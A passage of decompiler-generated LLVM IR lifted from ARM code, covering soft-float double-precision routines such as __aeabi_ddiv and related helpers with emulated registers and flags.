  %v6_17a78 = add i32 %v3_17a78, %v5_17a78
  store i32 %v6_17a78, i32* %r4.global-to-local, align 4
  %v3_17a7c = icmp ugt i32 %v1_17a70, 768
  br i1 %v3_17a7c, label %dec_label_pc_17a8c, label %dec_label_pc_17a80

dec_label_pc_17a80:                               ; preds = %bb42
  %v1_17a80 = icmp slt i32 %v0_17a80, 0
  %v2_17a80 = mul i32 %v0_17a80, 2
  store i32 %v2_17a80, i32* %lr.global-to-local, align 4
  %v3_17a84 = mul i32 %v14_17a64, 2
  %v4_17a84 = zext i1 %v1_17a80 to i32
  %v5_17a84 = or i32 %v4_17a84, %v3_17a84
  %v9_17a84 = icmp ule i32 %v5_17a84, %v14_17a64
  %v10_17a84 = icmp ult i32 %v3_17a84, %v14_17a64
  %v11_17a84 = select i1 %v1_17a80, i1 %v9_17a84, i1 %v10_17a84
  %v3_17a8825 = mul nuw nsw i64 %v12_17a64, 2
  %v3_17a88 = trunc i64 %v3_17a8825 to i32
  %v4_17a88 = zext i1 %v11_17a84 to i32
  %v5_17a88 = or i32 %v4_17a88, %v3_17a88
  br label %dec_label_pc_17a8c

dec_label_pc_17a8c:                               ; preds = %bb42, %dec_label_pc_17a80
  %v0_17a9c = phi i32 [ %v0_17a80, %bb42 ], [ %v2_17a80, %dec_label_pc_17a80 ]
  %v0_17a94 = phi i32 [ %v14_17a64, %bb42 ], [ %v5_17a84, %dec_label_pc_17a80 ]
  %v1_17a8c = phi i32 [ %v13_17a64, %bb42 ], [ %v5_17a88, %dec_label_pc_17a80 ]
  %v4_17a8c = mul i32 %v1_17a8c, 2048
  %v4_17a90 = udiv i32 %v0_17a94, 2097152
  %v5_17a8c = or i32 %v4_17a90, %v1_17a58
  %v5_17a90 = or i32 %v5_17a8c, %v4_17a8c
  store i32 %v5_17a90, i32* %r1.global-to-local, align 4
  %v3_17a94 = mul i32 %v0_17a94, 2048
  %v4_17a98 = udiv i32 %v0_17a9c, 2097152
  %v5_17a98 = or i32 %v3_17a94, %v4_17a98
  store i32 %v5_17a98, i32* %r0.global-to-local, align 4
  %v3_17a9c = mul i32 %v0_17a9c, 2048
  store i32 %v3_17a9c, i32* %lr.global-to-local, align 4
  %v1_17aa0 = add i32 %v6_17a78, -253
  store i32 %v1_17aa0, i32* %ip.global-to-local, align 4
  %v2_17aa0 = icmp ugt i32 %v6_17a78, 252
  %v7_17aa0 = icmp eq i32 %v6_17a78, 253
  %v2_17aa4 = xor i1 %v7_17aa0, true
  %v3_17aa4 = and i1 %v2_17aa0, %v2_17aa4
  br i1 %v3_17aa4, label %bb43, label %bb44

bb43:                                             ; preds = %dec_label_pc_17a8c
  %v6_17aa4 = icmp ugt i32 %v1_17aa0, 1791
  %v11_17aa4 = icmp eq i32 %v1_17aa0, 1792
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_17a8c, %bb43
  %v1_17aa8 = phi i1 [ %v7_17aa0, %dec_label_pc_17a8c ], [ %v11_17aa4, %bb43 ]
  %v0_17aa8 = phi i1 [ %v2_17aa0, %dec_label_pc_17a8c ], [ %v6_17aa4, %bb43 ]
  %v2_17aa8 = xor i1 %v1_17aa8, true
  %v3_17aa8 = and i1 %v0_17aa8, %v2_17aa8
  call void @__pseudo_cond_branch(i1 %v3_17aa8, i32 ptrtoint (i32* @global_var_17af4.696 to i32))
  %v0_17aac = load i32, i32* %lr.global-to-local, align 4
  %v2_17aac = icmp slt i32 %v0_17aac, 0
  %v6_17aac = icmp eq i32 %v0_17aac, -2147483648
  %v1_17ab0 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_17aac, label %bb45, label %._crit_edge

bb45:                                             ; preds = %bb44
  %v2_17ab0 = urem i32 %v1_17ab0, 2
  %v3_17ab0 = icmp ne i32 %v2_17ab0, 0
  %v4_17ab0 = udiv i32 %v1_17ab0, 2
  store i32 %v4_17ab0, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb44, %bb45
  %v1_17ab4 = phi i1 [ %v3_17ab0, %bb45 ], [ %v2_17aac, %bb44 ]
  %v2_17ab4 = zext i1 %v1_17ab4 to i32
  %v3_17ab4 = add i32 %v2_17ab4, %v1_17ab0
  store i32 %v3_17ab4, i32* %r0.global-to-local, align 4
  %v0_17ab8 = load i32, i32* %r1.global-to-local, align 4
  %v1_17ab8 = load i32, i32* %r4.global-to-local, align 4
  %v2_17ab8 = and i32 %v1_17ab8, 4096
  %v3_17ab8 = icmp ne i32 %v2_17ab8, 0
  %v4_17ab8 = mul i32 %v1_17ab8, 1048576
  %v6_17ab8 = add i32 %v4_17ab8, %v0_17ab8
  %v7_17ab8 = zext i1 %v3_17ab8 to i32
  %v8_17ab8 = add i32 %v7_17ab8, %v6_17ab8
  store i32 %v8_17ab8, i32* %r1.global-to-local, align 4
  %v2_17abc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17abc, i32* %r4.global-to-local, align 4
  store i32 %v12_17a08, i32* %lr.global-to-local, align 4
  ret i32 %v3_17ab4

dec_label_pc_17ac4:                               ; preds = %.thread3, %bb40
  %v1_17ad0 = phi i32 [ %v1_17a447, %.thread3 ], [ %v1_17a44, %bb40 ]
  %v1_17ac8 = phi i32 [ %v1_17a405, %.thread3 ], [ %v1_17a40, %bb40 ]
  %v1_17ac4 = and i32 %v2_17a2c, -2147483648
  %v2_17ac8 = or i32 %v1_17ac8, %v1_17ac4
  %v4_17acc1 = or i64 %tmp, %arg1
  %v4_17acc = trunc i64 %v4_17acc1 to i32
  store i32 %v4_17acc, i32* %r0.global-to-local, align 4
  %v2_17ad0 = xor i32 %v2_17ac8, %v1_17ad0
  store i32 %v2_17ad0, i32* %r1.global-to-local, align 4
  %v4_17ad4 = udiv i32 %v1_17a30, 2
  %v5_17ad4 = sub i32 %v2_17a28, %v4_17ad4
  store i32 %v5_17ad4, i32* %r4.global-to-local, align 4
  %v7_17ad4 = sub i32 0, %v5_17ad4
  %v8_17ad4 = and i32 %v2_17a28, %v7_17ad4
  %v11_17ad4 = icmp eq i32 %v2_17a28, %v4_17ad4
  %v7_17ad8 = icmp sgt i32 %v2_17a28, %v4_17ad4
  br i1 %v7_17ad8, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_17ac4
  %v10_17ad8 = sub i32 %v1_17a30, %v5_17ad4
  %v12_17ad8 = xor i32 %v5_17ad4, %v1_17a30
  %v13_17ad8 = xor i32 %v10_17ad8, %v1_17a30
  %v14_17ad8 = and i32 %v13_17ad8, %v12_17ad8
  %v17_17ad8 = icmp eq i32 %v1_17a30, %v5_17ad4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_17ac4, %bb46
  %v3_17ae4.in = phi i32 [ %v8_17ad4, %dec_label_pc_17ac4 ], [ %v14_17ad8, %bb46 ]
  %v2_17ae4.in = phi i32 [ %v5_17ad4, %dec_label_pc_17ac4 ], [ %v10_17ad8, %bb46 ]
  %v1_17ae4 = phi i1 [ %v11_17ad4, %dec_label_pc_17ac4 ], [ %v17_17ad8, %bb46 ]
  %v2_17ae4 = icmp slt i32 %v2_17ae4.in, 0
  %v3_17ae4 = icmp slt i32 %v3_17ae4.in, 0
  %v3_17adc = xor i1 %v3_17ae4, %v2_17ae4
  %v4_17adc = or i1 %v1_17ae4, %v3_17adc
  br i1 %v4_17adc, label %._crit_edge23, label %bb48

._crit_edge23:                                    ; preds = %bb47
  %v0_17ae4.pre = load i32, i32* %lr.global-to-local, align 4
  br label %bb49

bb48:                                             ; preds = %bb47
  %v9_17adc30 = mul i32 %v5_17ad4, 1048576
  %v10_17adc31 = or i32 %v2_17ad0, %v9_17adc30
  store i32 %v10_17adc31, i32* %r1.global-to-local, align 4
  %v7_17ae0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_17ae0, i32* %r4.global-to-local, align 4
  store i32 %v12_17a08, i32* %lr.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %._crit_edge23, %bb48
  %v0_17ae4 = phi i32 [ %v0_17ae4.pre, %._crit_edge23 ], [ %v12_17a08, %bb48 ]
  %v6_17ae4 = xor i1 %v4_17adc, true
  call void @__pseudo_cond_branch(i1 %v6_17ae4, i32 %v0_17ae4)
  %v0_17ae8 = load i32, i32* %r1.global-to-local, align 4
  %v1_17ae8 = or i32 %v0_17ae8, 1048576
  store i32 %v1_17ae8, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_17af0 = load i32, i32* %r4.global-to-local, align 4
  %v1_17af0 = add i32 %v0_17af0, -1
  store i32 %v1_17af0, i32* %r4.global-to-local, align 4
  ret i32 %v4_17acc

; uselistorder directives
  uselistorder i32 %v5_17ad4, { 1, 0, 5, 3, 4, 2, 6 }
  uselistorder i32 %v4_17ad4, { 2, 1, 0 }
  uselistorder i32 %v1_17ab0, { 2, 0, 1 }
  uselistorder i32 %v0_17aac, { 1, 0 }
  uselistorder i1 %v7_17aa0, { 1, 0 }
  uselistorder i32 %v2_17a80, { 1, 0 }
  uselistorder i1 %v1_17a80, { 1, 0 }
  uselistorder i32 %v6_17a78, { 0, 2, 1, 3 }
  uselistorder i32 %v0_17a80, { 1, 0, 2 }
  uselistorder i32 %v14_17a64, { 1, 3, 2, 0 }
  uselistorder i64 %v11_17a64, { 1, 0 }
  uselistorder i64 %v12_17a5c, { 1, 0 }
  uselistorder i64 %v10_17a5c, { 1, 0 }
  uselistorder i64 %v7_17a54, { 1, 0 }
  uselistorder i64 %v6_17a4c, { 1, 0 }
  uselistorder i32 %v6_17a34, { 1, 0 }
  uselistorder i32 %v6_17a30, { 1, 0, 2 }
  uselistorder i32 %v1_17a30, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_17a28, { 4, 3, 0, 2, 1, 5, 6 }
  uselistorder i32 %v6_17a18, { 2, 1, 0 }
  uselistorder i32 %v5_17a14, { 2, 1, 0 }
  uselistorder i32 %v12_17a08, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 2, 9, 10, 3, 4, 5, 6, 7, 1, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i32 %arg4, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_17ac4, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_17a8c, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %.thread2, { 3, 2, 1, 0 }
}

define i32 @function_17af4() local_unnamed_addr {
dec_label_pc_17af4:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_16 = alloca i32, align 4
  %v0_17af4 = load i1, i1* @cpsr_z, align 1
  %v1_17af4 = load i1, i1* @cpsr_n, align 1
  %v2_17af4 = load i1, i1* @cpsr_v, align 1
  %v3_17af4 = xor i1 %v1_17af4, %v2_17af4
  %v4_17af4 = or i1 %v0_17af4, %v3_17af4
  br i1 %v4_17af4, label %dec_label_pc_17af8, label %dec_label_pc_17c70

dec_label_pc_17af8:                               ; preds = %dec_label_pc_17af4
  %v0_17af8 = load i32, i32* @r4, align 4
  %v4_17af8 = add i32 %v0_17af8, 54
  %v6_17af8 = sub i32 0, %v0_17af8
  %v7_17af8 = and i32 %v4_17af8, %v6_17af8
  %v8_17af8 = icmp slt i32 %v7_17af8, 0
  %v9_17af8 = icmp slt i32 %v4_17af8, 0
  %v10_17af8 = icmp eq i32 %v4_17af8, 0
  %v7_17afc = icmp sgt i32 %v0_17af8, -54
  br i1 %v7_17afc, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_17af8
  store i32 0, i32* @r0, align 4
  %v8_17b00 = load i32, i32* @r1, align 4
  %v9_17b00 = and i32 %v8_17b00, -2147483648
  store i32 %v9_17b00, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17af8, %bb
  %v4_17b08 = xor i1 %v9_17af8, %v8_17af8
  %v5_17b08 = or i1 %v10_17af8, %v4_17b08
  call void @__pseudo_cond_branch(i1 %v5_17b08, i32 %tmp7)
  %v0_17b0c = load i32, i32* @r4, align 4
  %v1_17b0c = sub i32 0, %v0_17b0c
  %v2_17b10 = sub i32 -32, %v0_17b0c
  %v4_17b10 = add i32 %v0_17b0c, 31
  %v5_17b10 = and i32 %v4_17b10, %v1_17b0c
  %v6_17b10 = icmp slt i32 %v5_17b10, 0
  store i1 %v6_17b10, i1* @cpsr_v, align 1
  %v6_17b14 = icmp slt i32 %v1_17b0c, 32
  br i1 %v6_17b14, label %dec_label_pc_17b18, label %dec_label_pc_17b84

dec_label_pc_17b18:                               ; preds = %.thread1
  %v1_17b18 = add i32 %v2_17b10, 12
  %v8_17b1c = icmp sgt i32 %v1_17b18, 0
  br i1 %v8_17b1c, label %dec_label_pc_17b54, label %dec_label_pc_17b20

dec_label_pc_17b20:                               ; preds = %dec_label_pc_17b18
  %v1_17b20 = add i32 %v2_17b10, 32
  %v1_17b24 = sub i32 0, %v2_17b10
  %v0_17b28 = load i32, i32* @r0, align 4
  %v6_17b28 = shl i32 %v0_17b28, %v1_17b24
  %v2_17b2c = add i32 %v2_17b10, 31
  %v3_17b2c = shl i32 1, %v2_17b2c
  %v6_17b2c = lshr i32 %v0_17b28, %v1_17b20
  %v1_17b30 = load i32, i32* @r1, align 4
  %v7_17b30 = shl i32 %v1_17b30, %v1_17b24
  %v8_17b30 = or i32 %v7_17b30, %v6_17b2c
  %v1_17b34 = and i32 %v1_17b30, -2147483648
  %tmp = bitcast i32 %v1_17b30 to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_17b38 = bitcast float %tmp19 to i32
  %tmp20 = icmp slt i32 %v6_17b28, 0
  %v4_17b3c = zext i1 %tmp20 to i32
  %v5_17b3c = add i32 %v8_17b30, %v4_17b3c
  %v5_17b40 = and i32 %v1_17b38, %v3_17b2c
  %v6_17b40 = icmp ne i32 %v5_17b40, 0
  %v7_17b40 = lshr i32 %v1_17b38, %v1_17b20
  %v9_17b40 = add i32 %v7_17b40, %v1_17b34
  %v10_17b40 = zext i1 %v6_17b40 to i32
  %v11_17b40 = add i32 %v9_17b40, %v10_17b40
  store i32 %v11_17b40, i32* @r1, align 4
  %v19_17b40 = add i32 %v11_17b40, %v10_17b40
  %v20_17b40 = xor i32 %v19_17b40, %v1_17b30
  %v21_17b40 = xor i32 %v19_17b40, %v7_17b40
  %v22_17b40 = and i32 %v20_17b40, %v21_17b40
  %v23_17b40 = icmp slt i32 %v22_17b40, 0
  store i1 %v23_17b40, i1* @cpsr_v, align 1
  %v3_17b44 = mul i32 %v6_17b28, 2
  %v4_17b44 = or i32 %v3_17b44, %tmp7
  %v5_17b44 = icmp slt i32 %v4_17b44, 0
  store i1 %v5_17b44, i1* @cpsr_n, align 1
  %v6_17b44 = icmp eq i32 %v4_17b44, 0
  store i1 %v6_17b44, i1* @cpsr_z, align 1
  br i1 %v6_17b44, label %bb13, label %bb14

bb13:                                             ; preds = %dec_label_pc_17b20
  %tmp21 = sext i1 %tmp20 to i32
  %v6_17b48 = add nsw i32 %tmp21, -1
  %v7_17b48 = and i32 %v5_17b3c, %v6_17b48
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_17b20, %bb13
  %v1_17b50 = phi i32 [ %v5_17b3c, %dec_label_pc_17b20 ], [ %v7_17b48, %bb13 ]
  %v2_17b4c = load i32, i32* %stack_var_16, align 4
  store i32 %v2_17b4c, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_17b50

dec_label_pc_17b54:                               ; preds = %dec_label_pc_17b18
  %v1_17b54 = sub i32 0, %v2_17b10
  %v1_17b58 = add i32 %v2_17b10, 32
  %v0_17b5c = load i32, i32* @r0, align 4
  %v6_17b5c = shl i32 %v0_17b5c, %v1_17b54
  %v6_17b60 = lshr i32 %v0_17b5c, %v1_17b58
  %v1_17b64 = load i32, i32* @r1, align 4
  %v7_17b64 = shl i32 %v1_17b64, %v1_17b54
  %v8_17b64 = or i32 %v7_17b64, %v6_17b60
  %v1_17b68 = and i32 %v1_17b64, -2147483648
  %tmp22 = icmp slt i32 %v6_17b5c, 0
  %v4_17b6c = zext i1 %tmp22 to i32
  %v5_17b6c = add i32 %v8_17b64, %v4_17b6c
  %v6_17b6c = icmp ult i32 %v5_17b6c, %v8_17b64
  %v2_17b70 = zext i1 %v6_17b6c to i32
  %v3_17b70 = or i32 %v2_17b70, %v1_17b68
  store i32 %v3_17b70, i32* @r1, align 4
  %v9_17b70 = add nsw i32 %v3_17b70, %v2_17b70
  %v10_17b70 = sub i32 0, %v1_17b64
  %v11_17b70 = and i32 %v9_17b70, %v10_17b70
  %v12_17b70 = icmp slt i32 %v11_17b70, 0
  store i1 %v12_17b70, i1* @cpsr_v, align 1
  %v3_17b74 = mul i32 %v6_17b5c, 2
  %v4_17b74 = or i32 %v3_17b74, %tmp7
  %v5_17b74 = icmp slt i32 %v4_17b74, 0
  store i1 %v5_17b74, i1* @cpsr_n, align 1
  %v6_17b74 = icmp eq i32 %v4_17b74, 0
  store i1 %v6_17b74, i1* @cpsr_z, align 1
  br i1 %v6_17b74, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_17b54
  %tmp23 = sext i1 %tmp22 to i32
  %v6_17b78 = add nsw i32 %tmp23, -1
  %v7_17b78 = and i32 %v5_17b6c, %v6_17b78
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_17b54, %bb15
  %v1_17b80 = phi i32 [ %v5_17b6c, %dec_label_pc_17b54 ], [ %v7_17b78, %bb15 ]
  %v2_17b7c = load i32, i32* %stack_var_16, align 4
  store i32 %v2_17b7c, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_17b80

dec_label_pc_17b84:                               ; preds = %.thread1
  %v1_17b84 = sub i32 32, %v2_17b10
  %v1_17b88 = load i32, i32* @r0, align 4
  %v7_17b88 = shl i32 %v1_17b88, %v1_17b84
  %v8_17b88 = or i32 %v7_17b88, %tmp7
  %v6_17b8c = lshr i32 %v1_17b88, %v2_17b10
  %v1_17b90 = load i32, i32* @r1, align 4
  %v7_17b90 = shl i32 %v1_17b90, %v1_17b84
  %v8_17b90 = or i32 %v7_17b90, %v6_17b8c
  %v6_17b94 = lshr i32 %v1_17b90, %v2_17b10
  %v1_17b98 = and i32 %v1_17b90, -2147483648
  store i32 %v1_17b98, i32* @r1, align 4
  %v7_17b9c = lshr i32 %v1_17b98, %v2_17b10
  %v8_17b9c = sub i32 -1, %v7_17b9c
  %v9_17b9c = and i32 %v6_17b94, %v8_17b9c
  %tmp24 = icmp slt i32 %v8_17b90, 0
  %v4_17ba0 = zext i1 %tmp24 to i32
  %v5_17ba0 = add i32 %v4_17ba0, %v9_17b9c
  %v3_17ba4 = mul i32 %v8_17b90, 2
  %v4_17ba4 = or i32 %v8_17b88, %v3_17ba4
  %v5_17ba4 = icmp slt i32 %v4_17ba4, 0
  store i1 %v5_17ba4, i1* @cpsr_n, align 1
  %v6_17ba4 = icmp eq i32 %v4_17ba4, 0
  store i1 %v6_17ba4, i1* @cpsr_z, align 1
  br i1 %v6_17ba4, label %bb17, label %bb18

bb17:                                             ; preds = %dec_label_pc_17b84
  %tmp25 = sext i1 %tmp24 to i32
  %v6_17ba8 = add nsw i32 %tmp25, -1
  %v7_17ba8 = and i32 %v5_17ba0, %v6_17ba8
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_17b84, %bb17
  %v1_17bb0 = phi i32 [ %v5_17ba0, %dec_label_pc_17b84 ], [ %v7_17ba8, %bb17 ]
  %v2_17bac = load i32, i32* %stack_var_16, align 4
  store i32 %v2_17bac, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_17bb0

dec_label_pc_17c70:                               ; preds = %dec_label_pc_17af4
  %v0_17c70 = load i32, i32* @r1, align 4
  %v1_17c70 = and i32 %v0_17c70, -2147483648
  %v1_17c78 = or i32 %v1_17c70, 2146435072
  store i32 %v1_17c78, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v5_17ba0, { 1, 0 }
  uselistorder i32 %v5_17b6c, { 1, 0, 2 }
  uselistorder i32 %v8_17b64, { 1, 0 }
  uselistorder i32 %v1_17b54, { 1, 0 }
  uselistorder i32 %v5_17b3c, { 1, 0 }
  uselistorder i32 %v1_17b30, { 1, 0, 2, 3 }
  uselistorder i32 %v1_17b24, { 1, 0 }
  uselistorder i32 %v2_17b10, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_17b0c, { 1, 0 }
  uselistorder i32 %v4_17af8, { 1, 2, 0 }
  uselistorder i32 %v0_17af8, { 1, 0, 2 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32 %tmp5, { 2, 1, 0 }
  uselistorder i32 -32, { 4, 3, 5, 6, 7, 11, 8, 12, 13, 9, 2, 10, 0, 1, 14 }
  uselistorder i32 54, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_17c88(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_17c88:
  %v1_17c8c = or i32 %arg1, 2146959360
  store i32 %v1_17c8c, i32* @r1, align 4
  %v1_17c94 = load i32, i32* @r0, align 4
  ret i32 %v1_17c94
}

define i32 @__aeabi_ddiv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_17c98 = load i32, i32* @r4, align 4
  store i32 %v3_17c98, i32* %stack_var_-16, align 4
  %v6_17c98 = load i32, i32* @r5, align 4
  %v9_17c98 = load i32, i32* @r6, align 4
  %v12_17c98 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_17ca4 = load i32, i32* @r1, align 4
  %v4_17ca4 = udiv i32 %v1_17ca4, 1048576
  %v5_17ca4 = urem i32 %v4_17ca4, 2048
  store i32 %v5_17ca4, i32* @r4, align 4
  %v6_17ca4 = icmp eq i32 %v5_17ca4, 0
  br i1 %v6_17ca4, label %entry..thread2_crit_edge, label %bb

entry..thread2_crit_edge:                         ; preds = %entry
  %.pre147 = udiv i32 %arg4, 1048576
  br label %.thread2

bb:                                               ; preds = %entry
  %v5_17ca8 = udiv i32 %arg4, 1048576
  %v6_17ca8 = urem i32 %v5_17ca8, 2048
  store i32 %v6_17ca8, i32* %r5.global-to-local, align 4
  %v7_17ca8 = icmp eq i32 %v6_17ca8, 0
  br i1 %v7_17ca8, label %.thread1, label %bb90

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_17e34

bb90:                                             ; preds = %bb
  %v5_17cac = icmp eq i32 %v5_17ca4, 2047
  br i1 %v5_17cac, label %.thread2, label %bb91

.thread2:                                         ; preds = %entry..thread2_crit_edge, %bb90
  %.pre145.pre-phi = phi i32 [ %.pre147, %entry..thread2_crit_edge ], [ %v5_17ca8, %bb90 ]
  br label %dec_label_pc_17e34

bb91:                                             ; preds = %bb90
  %v5_17cb0 = icmp eq i32 %v6_17ca8, 2047
  br i1 %v5_17cb0, label %dec_label_pc_17e34, label %dec_label_pc_17cb8

dec_label_pc_17cb8:                               ; preds = %bb91
  %v2_17cb8 = sub nsw i32 %v5_17ca4, %v6_17ca8
  store i32 %v2_17cb8, i32* %r4.global-to-local, align 4
  %v2_17cbc = xor i32 %v1_17ca4, %arg4
  %v4_17cc0 = mul i32 %arg4, 4096
  %v5_17cc0 = or i32 %v4_17cc0, %arg3
  store i32 %v5_17cc0, i32* %r5.global-to-local, align 4
  %v7_17cc0 = icmp eq i32 %v5_17cc0, 0
  %v3_17cc4 = mul i32 %v1_17ca4, 4096
  store i32 %v3_17cc4, i32* %r1.global-to-local, align 4
  br i1 %v7_17cc0, label %dec_label_pc_17e00, label %dec_label_pc_17ccc

dec_label_pc_17ccc:                               ; preds = %dec_label_pc_17cb8
  %tmp92 = mul i32 %arg4, 256
  %v4_17cd4 = and i32 %tmp92, 268435200
  %v4_17cd8 = udiv i32 %arg3, 16777216
  %v5_17cd4 = or i32 %v4_17cd8, %v4_17cd4
  %v5_17cd8 = or i32 %v5_17cd4, 268435456
  store i32 %v5_17cd8, i32* %r3.global-to-local, align 4
  %v3_17cdc = mul i32 %arg3, 256
  store i32 %v3_17cdc, i32* %r2.global-to-local, align 4
  %tmp93 = mul i32 %v1_17ca4, 256
  %v4_17ce0 = and i32 %tmp93, 268435200
  %v1_17ce4 = load i32, i32* @r0, align 4
  %v4_17ce4 = udiv i32 %v1_17ce4, 16777216
  %v5_17ce0 = or i32 %v4_17ce0, %v4_17ce4
  %v5_17ce4 = or i32 %v5_17ce0, 268435456
  store i32 %v5_17ce4, i32* %r5.global-to-local, align 4
  %v3_17ce8 = mul i32 %v1_17ce4, 256
  store i32 %v3_17ce8, i32* %r6.global-to-local, align 4
  %v1_17cec = and i32 %v2_17cbc, -2147483648
  store i32 %v1_17cec, i32* %r1.global-to-local, align 4
  %v3_17cf0 = icmp uge i32 %v5_17ce4, %v5_17cd8
  %v9_17cf0 = icmp eq i32 %v5_17ce4, %v5_17cd8
  br i1 %v9_17cf0, label %bb94, label %bb95

bb94:                                             ; preds = %dec_label_pc_17ccc
  %v4_17cf4 = icmp uge i32 %v3_17ce8, %v3_17cdc
  br label %bb95

bb95:                                             ; preds = %dec_label_pc_17ccc, %bb94
  %v1_17cf8 = phi i1 [ %v3_17cf0, %dec_label_pc_17ccc ], [ %v4_17cf4, %bb94 ]
  %v2_17cf8 = add nsw i32 %v2_17cb8, 253
  %v3_17cf8 = zext i1 %v1_17cf8 to i32
  %v4_17cf8 = add nsw i32 %v2_17cf8, %v3_17cf8
  %v8_17cf8 = icmp ule i32 %v4_17cf8, %v2_17cb8
  %v9_17cf8 = icmp ugt i32 %v2_17cb8, -254
  %v10_17cf8 = select i1 %v1_17cf8, i1 %v8_17cf8, i1 %v9_17cf8
  %v1_17cfc = add nsw i32 %v4_17cf8, 768
  store i32 %v1_17cfc, i32* %r4.global-to-local, align 4
  br i1 %v10_17cf8, label %dec_label_pc_17d0c, label %dec_label_pc_17d04

dec_label_pc_17d04:                               ; preds = %bb95
  %v3_17d04 = udiv i32 %v5_17cd8, 2
  store i32 %v3_17d04, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17d0c

dec_label_pc_17d0c:                               ; preds = %bb95, %dec_label_pc_17d04
  %v0_17d14 = phi i32 [ %v5_17cd8, %bb95 ], [ %v3_17d04, %dec_label_pc_17d04 ]
  %v0_17d18 = phi i32 [ %v3_17cdc, %bb95 ], [ 0, %dec_label_pc_17d04 ]
  %v2_17d0c = sub i32 %v3_17ce8, %v0_17d18
  store i32 %v2_17d0c, i32* %r6.global-to-local, align 4
  %v3_17d0c = icmp uge i32 %v3_17ce8, %v0_17d18
  %v3_17d10 = icmp eq i1 %v3_17d0c, false
  %v4_17d10 = sub nsw i32 %v5_17ce4, %v0_17d14
  %v6_17d10 = sext i1 %v3_17d10 to i32
  %v7_17d10 = add nsw i32 %v6_17d10, %v4_17d10
  store i32 %v7_17d10, i32* %r5.global-to-local, align 4
  %v3_17d14 = udiv i32 %v0_17d14, 2
  store i32 %v3_17d14, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17d24.outer

dec_label_pc_17d24.outer:                         ; preds = %dec_label_pc_17dbc, %dec_label_pc_17d0c
  %v1_17dd0.ph = phi i32 [ %v2_17dbc, %dec_label_pc_17dbc ], [ %v1_17cec, %dec_label_pc_17d0c ]
  %v0_17d28.ph = phi i32 [ %v5_17d98, %dec_label_pc_17dbc ], [ %v7_17d10, %dec_label_pc_17d0c ]
  %v1_17d2c.ph = phi i32 [ %v3_17d9c, %dec_label_pc_17dbc ], [ %v2_17d0c, %dec_label_pc_17d0c ]
  %v5_17da417.ph = phi i32 [ %v5_17da4, %dec_label_pc_17dbc ], [ %v3_17d14, %dec_label_pc_17d0c ]
  %v3_17da813.ph = phi i32 [ %v3_17da8, %dec_label_pc_17dbc ], [ 0, %dec_label_pc_17d0c ]
  %storemerge133 = phi i32 [ 0, %dec_label_pc_17dbc ], [ 1048576, %dec_label_pc_17d0c ]
